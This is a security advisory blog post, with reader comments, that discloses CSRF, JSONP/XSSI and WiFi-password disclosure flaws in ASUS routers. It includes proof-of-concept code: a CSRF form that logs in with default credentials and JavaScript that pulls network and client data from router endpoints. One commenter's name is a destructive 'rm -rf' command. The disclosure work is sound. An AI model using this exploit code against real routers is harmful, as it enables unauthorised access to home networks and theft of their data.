=== Content from wwws.nightwatchcybersecurity.com_6203a555_20250126_024814.html ===

[Skip to content](#content)
[![](https://wwws.nightwatchcybersecurity.com/wp-content/uploads/2016/06/1-coojnfoayruptsimgys6tw.png?w=140)](https://wwws.nightwatchcybersecurity.com/)
# [Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/)

## Cybersecurity services and research

Menu

* [Home](https://wwws.nightwatchcybersecurity.com/)
* [Blog](https://wwws.nightwatchcybersecurity.com/blog/)
* [Presentations](https://wwws.nightwatchcybersecurity.com/presentations/)
* [Tools](https://wwws.nightwatchcybersecurity.com/tools/)
* [Contact](https://wwws.nightwatchcybersecurity.com/contact/)

[Home](https://wwws.nightwatchcybersecurity.com/)Multiple Vulnerabilities in ASUS Routers
# Multiple Vulnerabilities in ASUS Routers

[May 9, 2017January 30, 2018](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/) [nightwatchcyber](https://wwws.nightwatchcybersecurity.com/author/nightwatchcyber/)
[Advisories](https://wwws.nightwatchcybersecurity.com/category/advisories/)[asus](https://wwws.nightwatchcybersecurity.com/tag/asus/), [csrf](https://wwws.nightwatchcybersecurity.com/tag/csrf/), [jsonp](https://wwws.nightwatchcybersecurity.com/tag/jsonp/), [routers](https://wwws.nightwatchcybersecurity.com/tag/routers/)

## Summary

Various models of ASUS RT routers have several CSRF vulnerabilities allowing malicious sites to login and change settings in the router; multiple JSONP vulnerabilities allowing exfiltration of router data and an XML endpoint revealing WiFi passwords.

Most of these issues have been fixed by Asus in the March 2017 firmware update under v3.0.0.4.380.7378. One issue (JSONP information disclosure – CVE-2017-5892) remains unfixed since the vendor doesn’t consider it to be a security threat **[UPDATE: Asus will be fixing this]**

CVE-2017-5891 has been assigned to the CSRF issues, and CVE-2017-5892 to cover the JSONP disclosure without login issue. **[ADDED 05/11/2017: Two additional CVEs have been issued to cover JSONP issues after login – CVE-2017-8877 – and the XML information disclosure issue – CVE-2017-8878].**

**[ADDED 05/28/2017: As reported in comments below, multiple other models may be affected; please review the list below for details on what is affected, and whether patches are available]**

## Vulnerability Details

RT routers from ASUS like many other routers come with a built-in web interface accessible over the local network but normally not accessible via the Internet. We discovered multiple issues within that web interface that would can facilitate attacks on the router either via a malicious site visited by a user on the same network, or a malicious mobile or desktop application running on the same network.

For the CSRF vulnerabilities, a user would need to visit a malicious site which can try to login and change settings. For the JSONP vulnerabilities, a website can load the JSONP endpoints via SCRIPT tags as long as matching function name is defined on that site. The XML endpoint requires a mobile or desktop application to exploit.

NOTE: all of these assume that the attacker knows the local IP address of the router. This could probably be guessed or be determined via Javascript APIs like [WebRTC](https://bugzilla.mozilla.org/show_bug.cgi?id=959893). For desktop and mobile applications, determination of the gateway address should be trivial to implement.

### **Issue #1 – Login Page CSRF (CVE-2017-5891)**

The login page for the router doesn’t have any kind of CSRF protection, thus allowing a malicious website to submit a login request to the router without the user’s knowledge. Obviously, this only works if the site either knows the username and password of the router OR the user hasn’t changed the default credentials (“admin / admin”). To exploit, submit the base-64 encoded username and password as “**login\_authorization”** form post, to the “**/login.cgi**” URL of the browser.

Example of a form that can exploit this issue (uses default credentials):

> ```
> <form action="http://192.168.1.1/login.cgi"
>    method="post" target="_blank">
> <input name="login_authorization" type="text"
>    value="YWRtaW46YWRtaW4=" />
> <input type="submit" /></form>
> ```

### **Issue #2 – Save Settings CSRF (CVE-2017-5891)**

The various pages within the interface that can save settings do not have CSRF protection. That means that a malicious site, once logged in as described above would be able to change any settings in the router without the user’s knowledge.

**NOTE: We have not been to exploit this issue consistently**

### Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-8877)

Two JSONP endpoints exist within the router which allow detection of which ASUS router is running and some information disclosure. No login is required to the router. **The vendor doesn’t consider these endpoints a security threat.** [ADDED 05/11/2017: A project named [Sonar.JS](https://github.com/mandatoryprogrammer/sonar.js/tree/master) exists on Github that describes how to use this with WebRTC to figure out which router the user is running, This project is an example of what is possible with an end point like this one].

The endpoints are as follows:

* /findasus.json
  + Returns the router model name, SSID name and the local IP address of the router
    - iAmAlive([{model?Name: “XXX”, ssid: “YYY”, ipAddr: “ZZZZ”}])
* /httpd\_check.json
  + Returns: {“alive”: 1, “isdomain”: 0}

Exploit code as follows:

> ```
> function iAmAlive(payload) {
>   window.alert("Result returned: " + JSON.stringify(payload));
> }
> function alert1() {
>   var script = document.createElement('script');
>   script.src = 'http://192.168.1.1/findasus.json'
>   document.getElementsByTagName('head')[0].appendChild(script);
> }
> function alert2() {
>   var script = document.createElement('script');
>   script.src = 'http://192.168.1.1/httpd_check.json'
>   document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> ```

### Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-5892)

There exist multiple JSONP endpoints within the router interface that reveal various data from the router including.

Below is a list of endpoints and exploit code:

**/status.asp – Network Information**

> ```
> function getstatus() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/status.asp'
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
> function show_wanlink_info() {
>     var obj = {};
>     obj.status = wanlink_status();
>     obj.statusstr = wanlink_statusstr();
>     obj.wanlink_type = wanlink_type();
>     obj.wanlink_ipaddr = wanlink_ipaddr();
>     obj.wanlink_xdns = wanlink_xdns();
>     window.alert(JSON.stringify(obj));
> }
>
> <br/>
> <button onClick="getstatus()">Load Status script</button>
> <button onClick="show_wanlink_info()">Show wanlink info</button>
> <br/><br/>
> ```

**/wds\_aplist\_2g.asp – Surrounding Access points, 2.4 Ghz band**

**/wds\_aplist\_5g.asp – Surrounding Access points, 5 Ghz band**

```
function getwds_2g() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/wds_aplist_2g.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}
function getwds_5g() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/wds_aplist_5g.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getwds_2g()">Load 2G info</button>
<button onClick="getwds_5g()">Load 5G info</button>
<button onClick="window.alert(JSON.stringify(wds_aplist))">Show AP info</button>
<br/><br/>
```

**/update\_networkmapd.asp – Network map of devices on the network**

> ```
> function getmap() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/update_networkmapd.asp'
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> <br/>
> <button onClick="getmap()">Load Network map</button>
> <button onClick="window.alert(JSON.stringify(fromNetworkmapd))">Show Map</button>
> <br/><br/>
> ```

**/update\_clients.asp – Origin data**

```
function getorigin() {
    originData = [];
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/update_clients.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getorigin()">Load Origin</button>
<button onClick="window.alert(JSON.stringify(originData))">Show Origin</button>
```

**/get\_real\_ip.asp – External IP address**

```
function getrealip() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/get_real_ip.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getrealip()">Load IP</button>
<button onClick="window.alert(JSON.stringify(wan0_realip_ip))">Show IP</button>
```

**/get\_webdavInfo.asp – WebDAV information**

> ```
> function getwebdav() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/get_webdavInfo.asp';
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> <br/>
> <button onClick="getwebdav()">Load WebDav</button>
> <button onClick="window.alert(JSON.stringify(pktInfo))">Show Info 1</button>
> <button onClick="window.alert(JSON.stringify(webdavInfo))">Show Info 1</button>
> <br/><br/>
> ```

### Issue #5 – XML Endpoint Reveals WiFi Passwords (CVE-2017-8878)

An XML endpoint exists in the router which reveals the WiFi password to the router but to fully exploit this issue, it would require a mobile or desktop application running on the local network since XML cannot be loaded cross origin in the browser. This endpoint can be accessed at the following URL and requires login:

> ```
> [router IP]/WPS_info.xml
>
> ```

## Mitigation Steps / Vendor Response

Users should change the default credentials and apply the latest firmware released by ASUS, version v3.0.0.4.380.7378 or higher **(except for 4G-AC55U which has no patches available).**

 **There is no mitigation available for the issue #3 – JSONP information disclosure without login.**

Affected models include the following ASUS routers **and is not exhaustive**:

* **4G-AC55U – [ADDED 05/10/2017, patches are available as of 06/13/2017]**
* RT-AC51U
* RT-AC52U B1 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC53 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC53U
* RT-AC55U
* RT-AC56R
* RT-AC56S
* RT-AC56U
* **RT-AC58U – [ADDED 05/28/2017: As reported by a commenter below, this one is also affected] [ADDED 06/15/2017 – firmware update now available]**
* RT-AC66U
* RT-AC68U
* RT-AC68UF – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC66R
* RT-AC66U
* RT-AC66W
* RT-AC68W
* RT-AC68P
* RT-AC68R
* RT-AC68U
* RT-AC87R
* RT-AC87U
* RT-AC88U – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1200 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1750 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1900P
* RT-AC3100
* RT-AC3200
* RT-AC5300
* **RT-AC1200G+ – [ADDED 06/15/2017: based on a comment below]**
* **RT-ACRH13 – [ADDED 05/28/2017: As reported by a commenter below, this one is also affected and has no patches]**
* RT-N11P
* RT-N12 (D1 version only)
* RT-N12+
* RT-N12E
* RT-N16 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-N18U
* RT-N56U
* RT-N66R – [07/20/2017 – as per commenter below, new firmware was released on July 17th, 2017 – v3.0.0.4.380.7743]
* RT-N66U (B1 version only)
* RT-N66W
* RT-N300 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-N600 – [ADDED 05/10/2017 based on Asus Firmware updates]

## References

CVE-IDs: [CVE-2017-5891](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5891), [CVE-2017-5892](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5892), [CVE-2017-8877](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8877) and [CVE-2017-8878](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8878)

CERT/CC Tracking # VR-627

## Credits

We would like to thank CERT/CC for helping to coordinate the disclosure process. This advisory was written by Yakov Shafranovich.

# Timeline

2017-01-21: Initial contact with the vendor

2017-01-23: Initial contact with CERT/CC

2017-02-05: Vulnerability details and POC code provided to the vendor, CVEs requested

2017-02-10: Vulnerability analysis received from the vendor

2017-02-12: Beta firmware provided by the firmware to test fixes

2017-02-12: Vendor fixes confirmed

2017-03-31: Fixed firmware released publicly by the vendor

2017-05-01: Draft advisory shared with the vendor and CERT/CC

2017-05-09: Public disclosure

### Share this:

* [Twitter](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?share=twitter "Click to share on Twitter")
* [Facebook](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?share=facebook "Click to share on Facebook")
Like Loading...

# Post navigation

[← Advisory: ChromeOS / ChromeBooks Persist Certain Network Settings in Guest Mode](https://wwws.nightwatchcybersecurity.com/2017/04/09/advisory-chromeos-chromebooks-persist-certain-network-settings-in-guest-mode/) [Advisory: Google I/O 2017 Android App Doesn’t Use SSL for Some Content [CVE-2017-9045] →](https://wwws.nightwatchcybersecurity.com/2017/05/17/advisory-google-io-2017-android-app/)

## 24 thoughts on “Multiple Vulnerabilities in ASUS Routers”

1. ![](https://0.gravatar.com/avatar/fd773bbe8b26f032726a92e4ce554233b12f160787b9b9ed836327d2c25bdfe3?s=60&d=identicon&r=G) **ng** says:
   [May 10, 2017 at 3:40 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-230)

   The Asus 4G-AC55U router is also affected by the issues listed in the article but it did not receive a firmware fix.

   The router is based on the same AsusWRT firmware as the RT series, just has a 4G LTE modem built in. The latest version 3.0.0.4.378.8150 was published a year ago on 2016-05-20 on the download page at <https://www.asus.com/Networking/4G-AC55U/HelpDesk_Download/>.

   I tested all the vulnerabilities listed above and can confirm they are present.

   Please update the article to warn the 4G-AC55U owners and pass this information to the vendor if possible.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=230#respond)
   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 10, 2017 at 9:03 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-234)

     We will take a look and update accordingly. Thank you for the information.

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=234#respond)
3. ![](https://0.gravatar.com/avatar/f054ce4e2e4fe8810322d414b88517af05a846599aab8372975eb0cfadd10c11?s=60&d=identicon&r=G) **asdf** says:
   [May 11, 2017 at 2:32 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-239)

   The JSONP Information Disclosure looks more like Cross-Site Script Inclusion (XSSI) as the URLs do not accept a user supplied callback parameter.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=239#respond)
5. **[Advisory: CVE-2017-5891 and CVE-2017-5892 (Pending) | Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/)** says:
   [May 11, 2017 at 11:29 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-256)

   […] This has been published here. […]

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=256#respond)
7. ![](https://1.gravatar.com/avatar/df2173310eedabe90916687ac7d0e3891a25bd66247bdcb5b619c7583023276f?s=60&d=identicon&r=G) **Major** says:
   [May 12, 2017 at 7:10 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-260)

   RT-N56U last firmware update was 1/12/2017 as ver. 3.0.0.4.376.3754

   but im running ver. 3.0.0.4.378\_4850 (more current than official?)

   wondering if im hacked?

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=260#respond)
   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 13, 2017 at 11:36 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-264)

     Not sure, sounds like it needs to be higher than v3.0.0.4.380.7378 and yours isn’t

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=264#respond)
9. ![](https://0.gravatar.com/avatar/3b712b9391d45badf98355fed652d8be8d0ef4c7c837d7a6f08a390f9fc8b04f?s=60&d=identicon&r=G) **PATRICK CHANG** says:
   [May 13, 2017 at 7:24 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-262)

   Can I assume the T-Mobile version of the RT-AC1900 is also affected – TM-AC1900? Its firmware remains at stuck at an earlier version.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=262#respond)
   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 13, 2017 at 11:35 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-263)

     We don’t know about the TM-AC19000

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=263#respond)
11. ![](https://i0.wp.com/pbs.twimg.com/profile_images/483749999277121536/ubnEd5-K_normal.jpeg?resize=60%2C60&ssl=1) **[John C Conkell (@juanzelli)](https://twitter.com/juanzelli)** says:
    [May 15, 2017 at 11:00 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-270)

    I’ve been using Merlin’s alternative firmware for over a year with zero issues… <https://asuswrt.lostrealm.ca>. He’s more interested in keeping things patched while only adding additional tweaks to the existing software. He doesn’t worry about trying to add new modules.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=270#respond)
13. ![](https://2.gravatar.com/avatar/b1a19d61e1850a59003179aff28f59e12b551f7e72a14a91c9ce7d41c99c82eb?s=60&d=identicon&r=G) **Johnny Sprocket** says:
    [May 17, 2017 at 12:51 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-276)

    I changed the SSL port on my RT-AC1900P to 8443. I tried to login using the standard HTTP:80 combo, and the router identifies itself as RT-N66U. The page shouldn’t resolve at all, but it seems the firmware has another flaw. Furthermore, the page will only render with Chrome on Windows 10 (1703). Firefox, IE, Edge show a connection error. A connection error is displayed via Chrome/Safari/Firefox from macOS as well. The ASUSRouter iOS app will no longer connect to the router, which could be a separate issue. Hopefully there is no vulnerabilities with this configuration. Can anyone confirm?

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=276#respond)
15. ![](https://2.gravatar.com/avatar/e5f890ce3c8fdafdf1d35983a38f5883fc7dcac9d7a44a383f0cfc34e7ca72c0?s=60&d=identicon&r=G) **[` rm -rf /\* `](https://itsecuritysolutions.org/)** says:
    [May 19, 2017 at 7:06 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-282)

    An authenticated session is not required to exploit the `/status.asp` XSSI information disclosure on Asus RT-N12E routers.

    The RT-N12E also exposes a `/get\_wan\_status.asp` file which discloses information such as the MAC addresses and IP addresses of client machines on the LAN.

    Here’s a BeEF module which exploits these issues:

    <https://github.com/beefproject/beef/tree/master/modules/exploits/router/asus_rt_n12e_get_info>

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=282#respond)
17. ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
    [May 28, 2017 at 7:47 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-291)

    Hey @nightwatchcyber

    Add this one to the list as well, RT-AC58U (or in the U.S. (and maybe other markets): RT-ACRH13).

    Verified manually with the CVE details and exploit code you have available, and the firmware version is also lower than the referenced 3.0.0.4.380\_6516, no newer one is available as of yet.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=291#respond)
    * ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
      [May 29, 2017 at 1:15 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-292)

      Update: I’ve contacted ASUS support via email, and they’ve informed me that there’s no ETA for the availability of a new firmware to fix this issues on this device (RT-AC58U/RT-ACRH13)

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=292#respond)
      + ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
        [June 15, 2017 at 5:47 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-336)

        Update: ASUS has released an update for the RT-AC58U. Should have the fixes implemented.

        ASUS RT-AC58U Firmware version 3.0.0.4.380.7485

        Add

        – Tx power adjust option

        – New Zealand ISP support

        – IPTV – HiNet MOD profile

        – Reboot Schedule support

        Optimization

        – Wireless 5GHz band performance

        – Wired performance in AP mode

        – Reduce system RAM usage

        – The max number of client connections

        Bug Fixes

        – Fixed system crash issue

        Please unzip the firmware file first then check the MD5 code.

        MD5: 71e06b665f988359a8b5f05c9bd00fbd
      + ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
        [June 15, 2017 at 8:23 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-337)

        Does this include the fixes for these issues?
      + ![](https://0.gravatar.com/avatar/c66b11966b7b66aadaad7034dc4ac5da86abe7706141a3452c9a3c164fc6db63?s=60&d=identicon&r=G) **s0x** says:
        [June 15, 2017 at 9:04 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-338)

        I believe it should, haven’t tested all yet. But the CVE-2017-5891 goes to the login page instead of logging in, so I’d say yes.
19. ![](https://0.gravatar.com/avatar/947b992398d28d05827ab93590e7af7859d46586ba81778faebcd7be94246afe?s=60&d=identicon&r=G) **Tim** says:
    [June 1, 2017 at 2:21 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-299)

    Updated my RT-N16 to firmware ver. 3.0.0.4.380\_7378 and can no longer get ports to negotiate a gigabit connection. ASUS support solution is to revert back. Heard of anyone else having this issue?

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=299#respond)
21. ![](https://0.gravatar.com/avatar/3a3b92c5d18557858f8c16b41c0fa402ddf6b9be892465114435025b740ff61f?s=60&d=identicon&r=G) **Tomi** says:
    [June 13, 2017 at 5:07 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-332)

    4G-AC55U has now new version of the firmware (3.0.0.4.380.7633). It should include fixes to the security problems.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=332#respond)
23. ![](https://0.gravatar.com/avatar/6fae4e7b4c6aa02516ce144c60490c93785c567e0fb2d2fc444446117791c03a?s=60&d=identicon&r=G) **Tomek** says:
    [June 15, 2017 at 3:18 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-335)

    RT-AC1200G+ is affected.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=335#respond)
    * ![](https://0.gravatar.com/avatar/053814a04062a142b0a5e555b82d3686fdc43086b1d1bd00f6f466f497cd6917?s=60&d=identicon&r=G) **nonqu** says:
      [June 16, 2017 at 8:16 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-339)

      Ane there is no firmware update

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=339#respond)
25. ![](https://0.gravatar.com/avatar/0cbe04901efd12c6c12daab7f0025aa542d9cf4cc851c0c2ca7cfc32bf4b8ac3?s=60&d=identicon&r=G) **Dennis** says:
    [July 20, 2017 at 2:17 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-397)

    ASUS RT-N66R Firmware version 3.0.0.4.380.7743 (July 17, 2017)

    Security fixed

    – Fixed CVE-2017-5892 (JSONP Information Disclosure)

    (among others)

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=397#respond)
27. **[Our Talk on ASUS Routers @BSidesDC | Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/2017/10/10/our-talk-on-asus-routers-bsidesdc/)** says:
    [October 10, 2017 at 10:35 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-747)

    […] weekend, we had a talk at BSides DC about hacking ASUS routers. The original blog post is here, slides for the talk can be found here, video can be found here (starting at the 3 hour […]

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=747#respond)
29. ![](https://0.gravatar.com/avatar/0985cfa6a4c670fd9cb3de24479c157c3eef2611859f0cc7f9e4b3397d0417f9?s=60&d=identicon&r=G) **tony** says:
    [January 29, 2018 at 11:03 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-937)

    Hi,

    Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-5892)

    Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-8877)

    About above vulnerability, is there any typo about the CVE id?

    I have double check the pdf from below link:

    [Click to access bsides\_fall\_2017.pdf](https://wwwsnightwatchcybersecuritycom.files.wordpress.com/2017/10/bsides_fall_2017.pdf)

    Looks like,

    Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-5892)

    – CVE should be CVE-2017-8877?

    Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-8877)

    – CVE should be CVE-2017-5892?

    Regards.

    [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=937#respond)
    * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
      [January 30, 2018 at 9:59 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-938)

      We corrected that, thank you

      [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=938#respond)

### Leave a reply to [asdf](#comment-239) [Cancel reply](/2017/05/09/multiple-vulnerabilities-in-asus-routers/#respond)

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed.](https://akismet.com/privacy/)

# Search

Search for:

# Categories

* [Advisories](https://wwws.nightwatchcybersecurity.com/category/advisories/) (66)
* [Opinion](https://wwws.nightwatchcybersecurity.com/category/opinion/) (4)
* [Research](https://wwws.nightwatchcybersecurity.com/category/research/) (43)
* [Tools](https://wwws.nightwatchcybersecurity.com/category/tools/) (4)
* [Uncategorized](https://wwws.nightwatchcybersecurity.com/category/uncategorized/) (2)

# Recent Posts

* [Insecure Bootstrap Process in Google’s Cloud SQL Proxy](https://wwws.nightwatchcybersecurity.com/2023/03/19/insecure-bootstrap-process-in-googles-cloud-sql-proxy/)
* [RFC 9116 / “security.txt” Has Been Published](https://wwws.nightwatchcybersecurity.com/2022/04/27/rfc-9116-security-txt-has-been-published/)
* [GitBleed – Finding Secrets in Mirrored Git Repositories – CVE-2022-24975](https://wwws.nightwatchcybersecurity.com/2022/02/11/gitbleed/)
* [Insecure Bootstrap Process in Oracle Cloud CLI](https://wwws.nightwatchcybersecurity.com/2022/02/06/insecure-bootstrap-process-in-oracle-cloud-cli/)
* [Three Reasons Why Log4J Is So Bad: Ubiquity, Severity and Exploitability](https://wwws.nightwatchcybersecurity.com/2021/12/31/three-reasons-why-log4j-is-so-bad-ubiquity-severity-and-exploitability/)
# Tags

[adobe](https://wwws.nightwatchcybersecurity.com/tag/adobe/)
[airflow](https://wwws.nightwatchcybersecurity.com/tag/airflow/)
[amazon](https://wwws.nightwatchcybersecurity.com/tag/amazon/)
[Android](https://wwws.nightwatchcybersecurity.com/tag/android/)
[apache](https://wwws.nightwatchcybersecurity.com/tag/apache/)
[apple](https://wwws.nightwatchcybersecurity.com/tag/apple/)
[arro](https://wwws.nightwatchcybersecurity.com/tag/arro/)
[asus](https://wwws.nightwatchcybersecurity.com/tag/asus/)
[avg](https://wwws.nightwatchcybersecurity.com/tag/avg/)
[aws](https://wwws.nightwatchcybersecurity.com/tag/aws/)
[boozt](https://wwws.nightwatchcybersecurity.com/tag/boozt/)
[bounties](https://wwws.nightwatchcybersecurity.com/tag/bounties/)
[browsers](https://wwws.nightwatchcybersecurity.com/tag/browsers/)
[bsidesdc](https://wwws.nightwatchcybersecurity.com/tag/bsidesdc/)
[bsidesde](https://wwws.nightwatchcybersecurity.com/tag/bsidesde/)
[bugcrowd](https://wwws.nightwatchcybersecurity.com/tag/bugcrowd/)
[chrome](https://wwws.nightwatchcybersecurity.com/tag/chrome/)
[chromebook](https://wwws.nightwatchcybersecurity.com/tag/chromebook/)
[chromeos](https://wwws.nightwatchcybersecurity.com/tag/chromeos/)
[cisco](https://wwws.nightwatchcybersecurity.com/tag/cisco/)
[conferences](https://wwws.nightwatchcybersecurity.com/tag/conferences/)
[content-spoofing](https://wwws.nightwatchcybersecurity.com/tag/content-spoofing/)
[crosswalk](https://wwws.nightwatchcybersecurity.com/tag/crosswalk/)
[csrf](https://wwws.nightwatchcybersecurity.com/tag/csrf/)
[cve-2019-0221](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-0221/)
[cve-2019-0232](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-0232/)
[cve-2019-10320](https://wwws.nightwatchcybersecurity.com/tag/cve-2019-10320/)
[duolingo](https://wwws.nightwatchcybersecurity.com/tag/duolingo/)
[eblaster](https://wwws.nightwatchcybersecurity.com/tag/eblaster/)
